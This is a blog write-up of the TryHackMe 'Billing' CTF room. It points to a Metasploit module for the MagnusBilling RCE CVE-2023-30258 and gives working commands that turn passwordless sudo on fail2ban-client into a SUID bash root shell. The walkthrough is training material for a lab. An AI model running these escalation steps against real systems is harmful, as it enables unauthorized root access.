---
title: TryHackMe Billing Write-Up Walk Through
date: 2025-03-09 08:00:00 +0200
categories: [TryHackMe, CTF, TryHackMe Write Up]
thumbnail: "assets/img/tryhackme-billings-room.png"
tags: [tryhackme,ctf, magnusbilling, ctf, fail2ban,unauthenticated Remote Command Execution]
description: "Exploit CVE-2023-30258 on TryHackMe's Billing room and escalate to root with fail2ban-client."
comments: false
media_subpath: /assets/img/
image:
  path: tryhackme-billings-room-f.png
  alt: TryHackMe Billing
---

## TryHackMe Billing Room: MagnusBilling Exploit - From Initial Access to Root

After running an initial scan, you'll discover a **MagnusBilling** instance running on **port 80**. A quick Google search reveals **CVE-2023-30258**, an **unauthenticated Remote Command Execution (RCE)** vulnerability—your ticket in.

**[You can follow YouTube video walk through here](https://youtu.be/p2ozqA4nbLg)**

## Exploiting CVE-2023-30258: Two Paths to Initial Access

There are two effective ways to exploit this:

- **Metasploit Module**: Fire up the `magnusbilling_unauth_rce_cve_2023_30258` module. Set your `LHOST` (your IP) and `RHOST` (target IP) to snag a shell.
- **Python Script**: Prefer a hands-on approach? Use a custom Python script for manual RCE.

Both drop you into a shell as the `asterisk` user on the `Billing` machine.

## Privilege Escalation: Unlocking Root with `fail2ban-client`

Once inside, run `sudo -l` and you'll see:

```console
asterisk@Billing:/$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

This is gold. The `asterisk` user can run `/usr/bin/fail2ban-client` as **root** without a password, opening up multiple escalation paths.

### Example Exploit: SUID Root Shell

Here's one method to get root:

```console
sudo /usr/bin/fail2ban-client set sshd addaction myexploit
sudo /usr/bin/fail2ban-client set sshd action myexploit actionban "chmod +s /bin/bash"
sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.5
ls -l /bin/bash
/bin/bash -p
```

# Want the Full Walkthrough?

Check out my **[full video walkthrough](https://youtu.be/p2ozqA4nbLg)** on my YouTube channel for step-by-step guidance:

**[CLICK HERE FOR YOUTUBE VIDEO WALK THROUGH](https://youtu.be/p2ozqA4nbLg)**

<a href="https://youtu.be/p2ozqA4nbLg">
  <img src="tryhackme-billings-room-youtube.png"  alt="TryHackMe Billing" >
</a>


